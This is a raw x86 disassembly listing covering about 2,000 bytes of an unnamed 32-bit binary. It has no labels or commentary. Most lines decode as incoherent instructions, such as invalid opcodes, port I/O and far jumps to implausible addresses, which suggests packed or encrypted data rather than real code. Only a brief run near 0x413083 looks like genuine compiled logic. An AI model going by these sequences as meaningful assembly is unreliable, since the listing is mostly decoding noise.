  412bdd:	jno    0x412c1c
  412bdf:	lods   eax,DWORD PTR ds:[esi]
  412be0:	sbb    esi,edi
  412be2:	fild   DWORD PTR [edi]
  412be4:	pop    eax
  412be5:	xor    eax,DWORD PTR [eax]
  412be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412be8:	cmp    cl,BYTE PTR [ebx+0x79]
  412beb:	xchg   esi,eax
  412bec:	loop   0x412c2b
  412bee:	out    0xc4,eax
  412bf0:	pop    esi
  412bf1:	fnstenv [ebx+0x6d8c7933]
  412bf7:	gs jo  0x412b91
  412bfa:	jp     0x412c0a
  412bfc:	sbb    al,0x81
  412bfe:	call   0x4c3dcda
  412c03:	js     0x412c59
  412c05:	ins    BYTE PTR es:[edi],dx
  412c06:	ins    DWORD PTR es:[edi],dx
  412c07:	ffreep st(0)
  412c09:	div    BYTE PTR [ebp-0x3b]
  412c0c:	mov    ds:0x26b655da,eax
  412c11:	dec    edx
  412c12:	mov    BYTE PTR [eax+esi*8-0x78],0x3d
  412c17:	dec    ecx
  412c18:	add    BYTE PTR [edx],ch
  412c1a:	pop    ds
  412c1b:	xchg   ebp,eax
  412c1c:	in     eax,dx
  412c1d:	fstp   DWORD PTR [edx+edi*2-0x1d]
  412c21:	inc    esp
  412c22:	ror    BYTE PTR [ecx],1
  412c24:	je     0x412c6f
  412c26:	inc    ebp
  412c27:	cmp    edx,esi
  412c29:	test   BYTE PTR [ebx+ebx*8],ch
  412c2c:	in     eax,0xce
  412c2e:	mov    ebp,0xb340bbee
  412c33:	dec    edx
  412c34:	push   eax
  412c35:	pop    edx
  412c36:	add    DWORD PTR [ecx+0x30e2d00c],eax
  412c3c:	imul   eax,DWORD PTR [edx],0xe924fe90
  412c42:	push   edx
  412c43:	fisubr WORD PTR [edx+ecx*2]
  412c46:	ror    ebp,1
  412c48:	(bad)  
  412c49:	push   esi
  412c4a:	pop    edx
  412c4b:	test   eax,0x63612755
  412c50:	dec    eax
  412c51:	setl   BYTE PTR [edi+0x52]
  412c55:	jmp    0x278c80ea
  412c5a:	cdq    
  412c5b:	call   0xbe9c:0x81b67f77
  412c62:	xlat   BYTE PTR ds:[ebx]
  412c63:	data16 mov es,WORD PTR ds:0x28c8c5ac
  412c6a:	mov    dh,BYTE PTR [ebx-0x10]
  412c6d:	jmp    0x412c2a
  412c6f:	loope  0x412c9c
  412c71:	mov    esi,0xfb8244af
  412c76:	test   al,0x3b
  412c78:	mov    edx,DWORD PTR [eax+0x20]
  412c7b:	cdq    
  412c7c:	retf   0x9822
  412c7f:	xchg   ecx,eax
  412c80:	outs   dx,BYTE PTR ds:[esi]
  412c81:	sbb    al,0x94
  412c83:	jmp    0x6f6e7b17
  412c88:	add    eax,0x34fa112c
  412c8d:	sbb    al,0x45
  412c8f:	arpl   WORD PTR [ebx-0x72],sp
  412c92:	das    
  412c93:	scas   eax,DWORD PTR es:[edi]
  412c94:	or     al,0x19
  412c96:	hlt    
  412c97:	pushf  
  412c98:	cs pop esp
  412c9a:	or     al,0x2c
  412c9c:	adc    dh,BYTE PTR [ebx]
  412c9e:	sbb    DWORD PTR [ecx],0xffffffb7
  412ca1:	inc    edi
  412ca2:	xor    eax,DWORD PTR [esi-0x4c]
  412ca5:	jno    0x412cd7
  412ca7:	mov    ds,WORD PTR [ecx+0x25]
  412caa:	mov    ah,0x8e
  412cac:	fwait
  412cad:	mov    ebx,0xe63e5421
  412cb2:	cmp    ebx,DWORD PTR [ecx-0x3f8162f2]
  412cb8:	mov    ecx,0x60a8e1f0
  412cbd:	push   cs
  412cbe:	pop    esp
  412cbf:	clc    
  412cc0:	(bad)  
  412cc1:	xor    bl,BYTE PTR [ebp-0x4c675387]
  412cc7:	push   edx
  412cc8:	hlt    
  412cc9:	pop    esi
  412cca:	fwait
  412ccb:	push   0xaf5288d2
  412cd0:	out    0xa,eax
  412cd2:	test   al,0x59
  412cd4:	pop    es
  412cd5:	xor    eax,0x9fe8c3b7
  412cda:	xor    al,0x99
  412cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cdd:	jecxz  0x412ca5
  412cdf:	jg     0x412cde
  412ce1:	test   cl,cl
  412ce3:	mov    eax,ds:0x1f9d2e15
  412ce8:	imul   esp,DWORD PTR [ebp-0x3b],0x8aadbfc5
  412cef:	add    ah,ah
  412cf1:	add    eax,0x9e4e9f7f
  412cf6:	hlt    
  412cf7:	cli    
  412cf8:	lods   al,BYTE PTR ds:[esi]
  412cf9:	ins    DWORD PTR es:[edi],dx
  412cfa:	sti    
  412cfb:	xor    ecx,esi
  412cfd:	jmp    0x7ebf:0x2e6d6a1c
  412d04:	fsubr  DWORD PTR [eax]
  412d06:	mov    esi,DWORD PTR [edi-0x577c2069]
  412d0c:	mov    ds:0x8d598262,eax
  412d11:	inc    DWORD PTR [edi]
  412d13:	clc    
  412d14:	cmp    BYTE PTR [ebx],al
  412d16:	inc    si
  412d18:	xor    edx,ebx
  412d1a:	fadd   QWORD PTR [eax+eax*4+0x14]
  412d1e:	push   0x1a
  412d20:	jg     0x412d93
  412d22:	(bad)  
  412d24:	imul   esi,edi,0x7ad5c1f4
  412d2a:	ret    0xbac0
  412d2d:	cmp    DWORD PTR ds:0x6271e2eb,edi
  412d33:	imul   esp,DWORD PTR [eax-0x54ab48cd],0xffffffe4
  412d3a:	push   edx
  412d3b:	shl    DWORD PTR [ebx+edi*1],0x4c
  412d3f:	mov    al,0x4c
  412d42:	in     al,dx
  412d43:	sbb    al,0x66
  412d45:	jns    0x412d7a
  412d47:	jns    0x412d2b
  412d49:	pop    ds
  412d4a:	lods   eax,DWORD PTR ds:[esi]
  412d4b:	call   0xe62e:0x1607845c
  412d52:	mov    cl,0x8e
  412d54:	retf   
  412d55:	add    edi,DWORD PTR [edi]
  412d57:	inc    esi
  412d58:	pop    eax
  412d59:	lea    ebx,[ecx+0x3cd5881e]
  412d5f:	nop
  412d60:	aad    0x66
  412d62:	and    eax,0x8b04dbe5
  412d67:	jmp    0x4867d8b4
  412d6c:	xor    edi,esi
  412d6e:	pop    edx
  412d6f:	sbb    eax,0x77c61bf7
  412d74:	xor    esi,esp
  412d76:	add    bl,BYTE PTR [ebx]
  412d78:	push   0xffffff82
  412d7a:	fnstcw WORD PTR ds:0x94f26d5c
  412d80:	mov    ah,BYTE PTR [ebx-0x3fe51ae5]
  412d86:	movaps XMMWORD PTR [eax+0x1f],xmm3
  412d8a:	sub    edx,ebx
  412d8c:	cdq    
  412d8d:	cdq    
  412d8e:	mov    ebp,0xd83aa0bd
  412d93:	(bad)  
  412d94:	mov    dl,0xb
  412d96:	test   al,0x99
  412d98:	dec    eax
  412d99:	test   eax,0xa4dc72f5
  412d9e:	cmp    ebp,esi
  412da0:	inc    esi
  412da1:	rol    dl,1
  412da3:	out    dx,eax
  412da4:	pop    ebp
  412da5:	jmp    0xbad8:0x634c731f
  412dac:	out    dx,al
  412dad:	out    0x65,eax
  412daf:	gs mov esi,0x94c1e3e6
  412db5:	sub    BYTE PTR [ecx+0x34],bh
  412db8:	mov    BYTE PTR [edi+0x39f88f64],bh
  412dbe:	or     al,0xc4
  412dc0:	retf   
  412dc1:	mov    bl,0xf5
  412dc3:	sub    al,0x88
  412dc5:	mov    bh,0x7f
  412dc7:	fimul  WORD PTR [edx-0x65d9d6b8]
  412dcd:	add    eax,ecx
  412dcf:	mov    dh,0x40
  412dd1:	jbe    0x412e22
  412dd3:	sar    BYTE PTR [edi+0x51d7d2e6],1
  412dd9:	(bad)  
  412dda:	sar    bl,cl
  412ddc:	dec    ecx
  412ddd:	dec    eax
  412dde:	fxch   st(0)
  412de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412de1:	xor    DWORD PTR [esi],edx
  412de3:	int3   
  412de4:	retf   
  412de5:	(bad)  
  412de7:	scas   eax,DWORD PTR es:[edi]
  412de8:	xchg   esp,eax
  412de9:	aaa    
  412dea:	(bad)  
  412deb:	loop   0x412d93
  412ded:	add    eax,0x992d7815
  412df2:	fnstcw WORD PTR [ecx+ecx*2]
  412df5:	jne    0x412dd7
  412df7:	sub    eax,0xc3b1fe7f
  412dfc:	cwde   
  412dfd:	nop
  412dfe:	sub    ebp,0x7d
  412e01:	dec    esi
  412e02:	sahf   
  412e03:	ds in  al,dx
  412e05:	(bad)  
  412e06:	jmp    0x852b:0x434d39f9
  412e0d:	dec    eax
  412e0e:	call   0x8b82:0xfb1ef0fc
  412e15:	mov    ebx,0xeef1cf51
  412e1a:	or     eax,0x9c5f00c2
  412e1f:	sbb    al,0xe2
  412e21:	dec    edi
  412e22:	je     0x412dbd
  412e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e25:	rsm    
  412e27:	into   
  412e28:	dec    esi
  412e29:	out    dx,eax
  412e2a:	(bad)  
  412e2b:	scas   al,BYTE PTR es:[edi]
  412e2c:	inc    esp
  412e2d:	mov    cs,WORD PTR [edx+edi*1+0x669200d4]
  412e34:	mov    WORD PTR [ebx*4-0x47d3b004],?
  412e3b:	shl    BYTE PTR [ebx+0x1feb9ea7],cl
  412e41:	push   ds
  412e42:	cmp    DWORD PTR [ebx-0x4923ab97],esp
  412e48:	in     al,dx
  412e49:	inc    ecx
  412e4a:	adc    al,0xd8
  412e4c:	out    dx,al
  412e4d:	mov    ecx,0xd043b9a5
  412e52:	jae    0x412ed1
  412e54:	les    ecx,FWORD PTR [esi-0x2c]
  412e57:	sub    al,0xb0
  412e59:	in     eax,dx
  412e5a:	les    edx,FWORD PTR [ebp+0x478ee343]
  412e60:	mov    edx,0x89e13a3
  412e65:	sub    BYTE PTR [esi],dl
  412e67:	js     0x412e7d
  412e69:	inc    edx
  412e6a:	jmp    0xb82de0ad
  412e6f:	test   al,0x56
  412e71:	cmp    bh,dl
  412e73:	adc    BYTE PTR ds:0xfb514ddc,ch
  412e79:	push   edx
  412e7a:	xor    eax,0xa3854a96
  412e7f:	jb     0x412e31
  412e81:	push   ebp
  412e82:	push   ebp
  412e83:	enter  0xb5b3,0xf8
  412e87:	or     ah,BYTE PTR [ecx]
  412e89:	jle    0x412ee7
  412e8b:	dec    esp
  412e8c:	(bad)  
  412e8d:	fdivr  DWORD PTR [edi]
  412e8f:	dec    esp
  412e90:	or     ebx,0x83a6a5c9
  412e96:	aam    0x49
  412e98:	daa    
  412e99:	jae    0x412e9e
  412e9b:	cmp    BYTE PTR [edi+0x7a787bb4],0x7e
  412ea2:	dec    eax
  412ea3:	pop    eax
  412ea4:	mov    dl,0x7b
  412ea6:	sbb    ebx,DWORD PTR [ecx]
  412ea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ea9:	shr    ch,0x3c
  412eac:	fmul   st(5),st
  412eae:	out    0x3c,al
  412eb0:	mov    bh,0x4d
  412eb2:	retf   0xc49e
  412eb5:	or     al,0xf2
  412eb7:	loopne 0x412ebe
  412eb9:	mov    edx,0x74abf77f
  412ebe:	xchg   esi,eax
  412ebf:	mov    edx,0x56e0cad5
  412ec4:	xchg   ecx,ebx
  412ec6:	mov    BYTE PTR [edx+0x54],dh
  412ec9:	push   esp
  412eca:	pop    ds
  412ecb:	in     eax,0x3
  412ecd:	xor    ch,BYTE PTR [ebx+0x3538bb5c]
  412ed3:	fldenv [edi]
  412ed5:	fdivp  st(2),st
  412ed7:	das    
  412ed8:	in     al,dx
  412ed9:	(bad)  
  412eda:	daa    
  412edb:	xor    eax,0xf6e00116
  412ee0:	retf   
  412ee1:	data16 sub bh,dh
  412ee4:	rol    DWORD PTR [eax+esi*2-0x4e],0x77
  412ee9:	dec    esi
  412eea:	stos   DWORD PTR es:[edi],eax
  412eeb:	pop    edx
  412eec:	out    0xa8,eax
  412eee:	popa   
  412eef:	sbb    esi,DWORD PTR [edi+0x19]
  412ef2:	(bad)  
  412ef3:	or     al,0x80
  412ef5:	mov    ds,WORD PTR [ebx+0x5f]
  412ef8:	add    BYTE PTR [esi-0x76c6e830],ah
  412efe:	push   esi
  412eff:	shl    esi,cl
  412f01:	sub    bh,BYTE PTR [edi+0x63]
  412f04:	cld    
  412f05:	outs   dx,DWORD PTR ds:[esi]
  412f06:	xor    bl,BYTE PTR [eax]
  412f08:	add    al,dh
  412f0a:	repnz fxam 
  412f0d:	ins    BYTE PTR es:[edi],dx
  412f0e:	aas    
  412f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f10:	mov    esi,0x74d9bd08
  412f15:	adc    esp,DWORD PTR [eax-0x80]
  412f18:	jae    0x412ef6
  412f1a:	imul   esp,esp,0x46
  412f1d:	sub    BYTE PTR [esi],ah
  412f1f:	push   es
  412f20:	cmp    al,0xa
  412f22:	jmp    DWORD PTR [ecx]
  412f24:	inc    ecx
  412f25:	int3   
  412f26:	(bad)  
  412f27:	sub    ebp,DWORD PTR [ebp+edi*4-0x38]
  412f2b:	aaa    
  412f2c:	cmp    DWORD PTR [edi-0x3eeb249d],0x45
  412f33:	jl     0x412ec6
  412f35:	hlt    
  412f36:	fs inc ecx
  412f38:	add    DWORD PTR [ebx],ebx
  412f3a:	or     dh,dl
  412f3c:	icebp  
  412f3d:	repz mov bl,0xbb
  412f40:	dec    ebx
  412f41:	xor    bl,BYTE PTR [esi]
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	imul   edx,ebx,0x6d
  412f47:	mov    esi,edx
  412f49:	and    esp,DWORD PTR [ebp+0xb]
  412f4c:	and    al,0xc0
  412f4e:	shl    DWORD PTR [edi+0x1d6b132c],1
  412f54:	push   ecx
  412f55:	aaa    
  412f56:	stos   WORD PTR es:[edi],ax
  412f58:	mov    dl,0x3d
  412f5a:	sti    
  412f5b:	repnz aaa 
  412f5d:	xchg   edx,eax
  412f5e:	and    DWORD PTR [eax-0x5b387656],ecx
  412f64:	cmc    
  412f65:	int    0x7a
  412f67:	pop    edx
  412f68:	jl     0x412f02
  412f6a:	out    0xfc,al
  412f6c:	xor    DWORD PTR gs:[ecx-0x65af6e1b],eax
  412f73:	sub    al,0xd5
  412f75:	out    dx,eax
  412f76:	inc    esp
  412f77:	sbb    eax,0xc19a9b4b
  412f7c:	jae    0x412fc2
  412f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f7f:	iret   
  412f80:	fs hlt 
  412f82:	dec    edi
  412f83:	pop    ebp
  412f84:	fcomp  DWORD PTR [edx]
  412f86:	or     edi,esi
  412f88:	fcomp  QWORD PTR [eax+eiz*1-0x4ce43f0c]
  412f8f:	mov    ds:0x50d0371a,eax
  412f94:	and    BYTE PTR [esi-0x1dd7c9ad],bl
  412f9a:	xchg   edi,eax
  412f9b:	shl    BYTE PTR [ebx-0x213c50d4],cl
  412fa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fa2:	leave  
  412fa3:	sbb    al,BYTE PTR [ebp-0x5b0d43fd]
  412fa9:	std    
  412faa:	dec    ebx
  412fab:	loope  0x413002
  412fad:	mov    BYTE PTR [eax],cl
  412faf:	into   
  412fb0:	hlt    
  412fb1:	out    0x7,al
  412fb3:	push   ebx
  412fb4:	bound  ebx,QWORD PTR [edx-0x7e11021a]
  412fba:	mov    esi,fs
  412fbc:	pop    eax
  412fbd:	(bad)  
  412fbe:	iret   
  412fbf:	add    al,0x88
  412fc2:	xchg   esi,eax
  412fc3:	ret    
  412fc4:	or     al,0x2c
  412fc6:	xor    al,0xb2
  412fc8:	push   ds
  412fc9:	jmp    0x4727:0xcc1b7c6a
  412fd0:	sti    
  412fd1:	pop    es
  412fd2:	add    DWORD PTR [ebx-0x5f],edx
  412fd5:	aaa    
  412fd6:	outs   dx,DWORD PTR ds:[esi]
  412fd7:	push   es
  412fd8:	mov    ebx,0x7df17f9a
  412fdd:	and    al,0x12
  412fdf:	inc    ecx
  412fe0:	lods   eax,DWORD PTR ds:[esi]
  412fe1:	outs   dx,BYTE PTR ds:[esi]
  412fe2:	or     eax,0x137d8427
  412fe7:	hlt    
  412fe8:	int3   
  412fe9:	cli    
  412fea:	mov    ds:0xd390531e,eax
  412fef:	imul   edi,DWORD PTR [edi-0x69],0x4e3f6e49
  412ff6:	scas   al,BYTE PTR es:[edi]
  412ff7:	sar    BYTE PTR [ebx],0xf5
  412ffa:	xchg   ebp,eax
  412ffb:	js     0x41306c
  412ffd:	xor    al,0x2e
  412fff:	push   0x4a
  413001:	dec    edx
  413002:	in     eax,dx
  413003:	xor    ah,bh
  413005:	je     0x412fb8
  413007:	or     eax,0xab580a43
  41300c:	sbb    DWORD PTR [edi-0x34],0x520276c
  413013:	cmp    DWORD PTR [edi-0x59071d99],esi
  413019:	scas   eax,DWORD PTR es:[edi]
  41301a:	scas   eax,DWORD PTR es:[edi]
  41301b:	aad    0xf
  41301d:	js     0x413091
  41301f:	jne    0x413022
  413021:	mov    cl,0x59
  413023:	test   al,0x4f
  413025:	or     edi,ecx
  413027:	dec    ebx
  413028:	xor    WORD PTR ss:[edi+esi*4+0x27],dx
  41302e:	cdq    
  41302f:	in     eax,0xb5
  413031:	push   eax
  413032:	enter  0x30e4,0x69
  413036:	loope  0x412fd9
  413038:	pop    esp
  413039:	pop    esi
  41303a:	icebp  
  41303b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41303c:	add    eax,0xd40fca54
  413041:	cdq    
  413042:	or     ecx,DWORD PTR [ebp-0x74]
  413045:	pop    ss
  413046:	cmc    
  413047:	mov    ebp,DWORD PTR ds:0x2d44c7fb
  41304d:	mov    ebp,0xdc91d921
  413052:	call   0xd43c3f81
  413057:	int3   
  413058:	stc    
  413059:	retf   
  41305a:	jmp    0x5e24143c
  41305f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413060:	jns    0x413091
  413062:	icebp  
  413063:	add    esp,DWORD PTR [esi]
  413065:	sbb    esp,ebx
  413067:	scas   al,BYTE PTR es:[edi]
  413068:	dec    edx
  413069:	out    0xfd,eax
  41306b:	rcr    DWORD PTR [ebx+edx*4+0x5151113d],1
  413072:	jl     0x9a270bd8
  413078:	inc    esp
  413079:	mov    dl,0x33
  41307b:	mov    ecx,0xd2331ee1
  413081:	or     eax,edx
  413083:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  413087:	mov    eax,DWORD PTR [ebp+0x14]
  41308a:	or     BYTE PTR [eax],cl
  41308c:	mov    eax,DWORD PTR [ebp-0x48]
  41308f:	mov    ecx,DWORD PTR [ebp-0x44]
  413092:	shrd   eax,ecx,0x2
  413096:	shr    ecx,0x2
  413099:	mov    ecx,DWORD PTR [ebp-0x48]
  41309c:	mov    edx,DWORD PTR [ebp-0x44]
  41309f:	xor    eax,edi
  4130a1:	xor    edx,edx
  4130a3:	or     eax,edx
  4130a5:	add    eax,DWORD PTR ds:0x422298
  4130ab:	shl    ecx,0x1e
  4130ae:	mov    DWORD PTR [ebp+0x14],eax
  4130b1:	jmp    0x41363b
  4130b6:	xchg   ebx,eax
  4130b7:	fadd   DWORD PTR [eax]
  4130b9:	mov    eax,ds:0xd89398c0
  4130be:	out    0x8d,al
  4130c0:	shr    BYTE PTR [eax-0x4d676fe7],cl
  4130c6:	mov    dh,0x10
  4130c8:	or     al,0x16
  4130ca:	cmp    eax,0x51161604
  4130cf:	icebp  
  4130d0:	fstp   st(5)
  4130d2:	cmp    al,bh
  4130d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130d5:	adc    ah,ah
  4130d7:	call   0xc8285a4a
  4130dc:	sbb    dl,BYTE PTR [edi-0x4d]
  4130df:	(bad)  
  4130e1:	mov    bl,0x9f
  4130e3:	repnz pop ebp
  4130e5:	add    dl,BYTE PTR [esi-0x6c]
  4130e8:	sub    eax,0xb1eb21ce
  4130ed:	loopne 0x4130bd
  4130ef:	mov    eax,0x97301d07
  4130f4:	jle    0x413124
  4130f6:	mov    cl,0xf5
  4130f8:	sub    al,0xd8
  4130fa:	cmp    al,0xbe
  4130fc:	aas    
  4130fd:	adc    DWORD PTR [edx+eax*1+0x4f96575e],0x3d7b3529
  413108:	scas   al,BYTE PTR es:[edi]
  413109:	scas   eax,DWORD PTR es:[edi]
  41310a:	imul   BYTE PTR [esi+0x7bffb813]
  413110:	lock loop 0x4130bc
  413113:	and    ebx,DWORD PTR ds:[eax-0x52]
  413117:	adc    al,0xb6
  413119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41311a:	mov    cl,0xb0
  41311c:	mov    WORD PTR [eax],?
  41311e:	ret    
  41311f:	sub    bh,BYTE PTR [ecx-0x41c464d]
  413125:	pop    ds
  413126:	leave  
  413127:	int    0x88
  413129:	fcom   st(4)
  41312b:	pusha  
  41312c:	adc    edx,DWORD PTR [ebp-0x1a5b89e1]
  413132:	popa   
  413133:	cmp    edx,DWORD PTR [ebp-0x3093aae]
  413139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41313a:	(bad)  
  41313b:	fnstsw WORD PTR [ebx]
  41313d:	sti    
  41313e:	les    esi,FWORD PTR [edx+0x65d9bad5]
  413144:	repz cmp edx,DWORD PTR [eax+0x207ec963]
  41314b:	imul   ebp,DWORD PTR [eax-0x52c1fa26],0xffffffde
  413152:	jo     0x41319f
  413154:	inc    eax
  413155:	not    DWORD PTR [edi+0x73]
  413158:	in     al,dx
  413159:	in     al,dx
  41315a:	ret    0x6020
  41315d:	dec    eax
  41315e:	test   BYTE PTR [edi+0x11],0x60
  413162:	adc    ch,cl
  413164:	mov    edx,eax
  413166:	ins    DWORD PTR es:[edi],dx
  413167:	pop    ds
  413168:	xchg   ebp,eax
  413169:	out    0x92,al
  41316b:	test   eax,0x785d28a2
  413170:	mov    esi,0x2b998442
  413175:	mov    ecx,0x5fe676ac
  41317a:	sbb    dl,bh
  41317c:	add    DWORD PTR [edi+esi*2],ebp
  41317f:	into   
  413180:	jae    0x4131d9
  413182:	jmpw   0x376f
  413186:	outs   dx,BYTE PTR ds:[esi]
  413187:	sub    al,bl
  413189:	ror    DWORD PTR [esi*4+0x44cadc5f],1
  413190:	pop    edi
  413191:	out    0x61,eax
  413193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413194:	cmp    DWORD PTR [ebx],edx
  413196:	fst    st(7)
  413198:	or     al,0xda
  41319a:	in     al,dx
  41319b:	dec    BYTE PTR [ebp+0xebe79bc]
  4131a1:	jae    0x4131c8
  4131a3:	mov    ds:0x532d5af,al
  4131a8:	daa    
  4131a9:	sbb    DWORD PTR [esi-0x324efbe1],ebx
  4131af:	jle    0x41316c
  4131b1:	jno    0x413221
  4131b3:	(bad)
  4131b7:	sub    ebx,edx
  4131b9:	sub    edi,DWORD PTR [ecx+0x12a1874e]
  4131bf:	cwde   
  4131c0:	call   0xfcd9:0x778e3251
  4131c7:	rol    cl,0xae
  4131ca:	sub    al,0x6
  4131cc:	cld    
  4131cd:	sbb    BYTE PTR [edx+0x284c984a],ah
  4131d3:	aas    
  4131d4:	sbb    al,al
  4131d6:	pop    ecx
  4131d7:	mov    al,ds:0xd9f2774b
  4131dc:	jmp    0x3296:0x38d1cd7c
  4131e3:	pop    ss
  4131e4:	es fadd st(6),st
  4131e7:	sub    al,0xab
  4131e9:	xor    DWORD PTR [ebx+0x64],edi
  4131ec:	sahf   
  4131ed:	sbb    eax,0x557e2d22
  4131f2:	pop    ebx
  4131f3:	and    DWORD PTR [eax-0x65],esp
  4131f6:	sbb    BYTE PTR [eax],0x5f
  4131f9:	test   DWORD PTR [ecx+edx*1+0x4d],ebp
  4131fd:	add    BYTE PTR [ebx+0x1a18b5b8],0xde
  413204:	das    
  413205:	loope  0x413225
  413207:	shl    DWORD PTR [edi*4-0x7fcabbf8],0x99
  41320f:	and    DWORD PTR [ebx],eax
  413211:	loopne 0x4131e3
  413213:	mov    edi,0x1d6aea2b
  413218:	loopne 0x413241
  41321a:	out    dx,al
  41321b:	dec    edx
  41321c:	cmp    DWORD PTR [eax],ebx
  41321e:	pop    edx
  41321f:	stc    
  413220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413221:	repnz push 0xe58d83ac
  413227:	dec    edi
  413228:	into   
  413229:	into   
  41322a:	shl    BYTE PTR [edi+0x42f6df7],1
  413230:	fst    DWORD PTR [edi+esi*1-0x1ac8f42f]
  413237:	retf   
  413238:	and    eax,0x601f7c8
  41323d:	pop    ds
  41323e:	mov    ch,0x99
  413240:	into   
  413241:	dec    ecx
  413242:	test   eax,0x3854e6ac
  413247:	lods   al,BYTE PTR ds:[esi]
  413248:	dec    eax
  413249:	mov    bl,0x27
  41324b:	pushf  
  41324c:	loope  0x413204
  41324e:	test   DWORD PTR [ecx-0xbd93a99],esp
  413254:	les    ebp,FWORD PTR [ebx+ebp*2+0x277be2ac]
  41325b:	imul   ebx,DWORD PTR [esi+0x2e],0xaf6d9ede
  413262:	xor    al,0x47
  413264:	add    BYTE PTR [eax-0x451be5df],0x98
  41326b:	out    0x1c,al
  41326d:	xchg   ebp,eax
  41326e:	ret    
  41326f:	mov    ch,0xe3
  413271:	mov    dl,0x5
  413273:	jmp    0x413265
  413275:	out    dx,eax
  413276:	xor    eax,0xd05b5e5a
  41327b:	punpckhwd mm4,QWORD PTR [ebx]
  41327e:	cmp    DWORD PTR [ecx+0x16],edx
  413281:	in     eax,0x3d
  413283:	cdq    
  413284:	or     ebp,DWORD PTR [edx+0x3d]
  413287:	div    BYTE PTR [ecx-0x732d3bb6]
  41328d:	cmp    dl,BYTE PTR [edx-0x203c3c15]
  413293:	gs mov dl,0x41
  413296:	push   esi
  413297:	(bad)  
  413298:	out    dx,eax
  413299:	or     dh,cl
  41329b:	(bad)  
  41329c:	xchg   ecx,eax
  41329d:	stos   BYTE PTR es:[edi],al
  41329e:	(bad)  
  41329f:	and    esp,ecx
  4132a1:	push   esp
  4132a2:	lods   al,BYTE PTR ds:[esi]
  4132a3:	cwde   
  4132a4:	idiv   BYTE PTR [ebp+eax*1-0x3b02cb5]
  4132ab:	in     al,0x59
  4132ad:	lds    ebx,FWORD PTR [ecx-0x7dcc20ac]
  4132b3:	out    0x2c,eax
  4132b5:	sar    esi,1
  4132b7:	xlat   BYTE PTR ds:[ebx]
  4132b8:	mov    dl,0xfa
  4132ba:	xchg   ebp,eax
  4132bb:	out    0xc5,al
  4132bd:	ret    
  4132be:	xor    edi,DWORD PTR [ebx-0xf]
  4132c1:	sbb    BYTE PTR [esi+0x512de5b3],cl
  4132c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132c8:	and    al,0x67
  4132ca:	sub    cl,BYTE PTR [ecx]
  4132cc:	push   ecx
  4132cd:	jmp    0x4132a1
  4132cf:	push   edi
  4132d1:	adc    BYTE PTR [edi+0x56888837],ch
  4132d7:	push   esp
  4132d8:	in     eax,dx
  4132d9:	mov    WORD PTR [ecx-0x41],cs
  4132dc:	xor    DWORD PTR [edi],ebx
  4132de:	or     al,0xde
  4132e0:	sahf   
  4132e1:	push   0xc92b1bd8
  4132e6:	(bad)  
  4132e7:	mov    al,dh
  4132e9:	xlat   BYTE PTR ds:[ebx]
  4132ea:	push   ebp
  4132eb:	aaa    
  4132ec:	jmp    0x41336d
  4132ee:	scas   eax,DWORD PTR es:[edi]
  4132ef:	or     ah,BYTE PTR [esi]
  4132f1:	bound  ebp,QWORD PTR [ebx-0x26f30a9c]
  4132f7:	repz out dx,al
  4132f9:	cli    
  4132fa:	jo     0x413334
  4132fc:	jmp    0x4132b6
  4132fe:	xor    BYTE PTR [esi],0xcf
  413301:	out    0x95,al
  413303:	dec    ecx
  413304:	setl   al
  413307:	scas   eax,DWORD PTR es:[edi]
  413308:	ret    
  413309:	out    dx,eax
  41330a:	mov    eax,ds:0xdfa63d30
  41330f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413310:	xchg   edx,eax
  413311:	mov    ch,0x2a
  413313:	test   eax,0x7f54d816
  413318:	call   0xb8ebaf9d
  41331d:	pop    ebp
  41331e:	xor    BYTE PTR [eax],al
  413320:	push   cs
  413321:	aad    0x2e
  413323:	xchg   edx,eax
  413324:	test   BYTE PTR [edx+0x61],dh
  413327:	xor    bl,BYTE PTR [ebx]
  413329:	jb     0x4132b7
  41332b:	(bad)  [edi-0x6ef2478b]
  413331:	icebp  
  413332:	inc    ebx
  413333:	and    ebp,DWORD PTR [edi]
  413335:	and    al,0x7b
  413337:	stos   BYTE PTR es:[edi],al
  413338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413339:	add    eax,0x424ccdea
  41333e:	adc    esi,ebp
  413340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413341:	mov    cs,WORD PTR [eax+0x2deee9e0]
  413347:	ss jmp 0x4133b8
  41334a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41334b:	add    al,ah
  41334d:	or     ah,bh
  41334f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413350:	or     eax,0xc7b99b9
  413355:	jne    0x41337b
  413357:	cs ins DWORD PTR es:[edi],dx
  413359:	or     eax,0x74d66753
  41335e:	sahf   
  41335f:	ins    DWORD PTR es:[edi],dx
  413360:	xor    edx,ebx
  413362:	into   
  413363:	jne    0x41339f
  413365:	lahf   
  413366:	popf   
  413367:	dec    edx
  413368:	aaa    
  413369:	adc    ch,BYTE PTR [ecx-0x760ae0a1]
  41336f:	mov    ecx,0xe51fb342
  413374:	aad    0xbf
  413376:	sahf   
  413377:	jmp    0x49a0:0x1d32ada0
  41337e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41337f:	dec    edx
  413380:	sub    esp,DWORD PTR [ebx+ebp*2-0xb]
  413384:	xor    eax,0x785d176e
  413389:	mov    edx,0xcd5855cc
  41338e:	mov    ebp,0xfd58538c
